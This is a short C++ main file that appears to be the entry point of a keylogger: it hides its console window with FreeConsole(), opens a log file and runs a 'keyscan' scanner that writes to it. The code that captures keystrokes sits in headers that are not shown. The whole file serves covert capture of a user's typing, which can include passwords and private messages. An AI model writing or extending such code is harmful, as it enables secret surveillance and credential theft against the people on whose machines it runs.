#include "pch.h"

#include "log/logFILE/file.h"
#include "keyscan/keyscan.h"

int main() {
	FreeConsole();
	auto* l = new logFILE(FNAME);
	keyscan scanner(l);
	scanner.scan();
	return 1;
}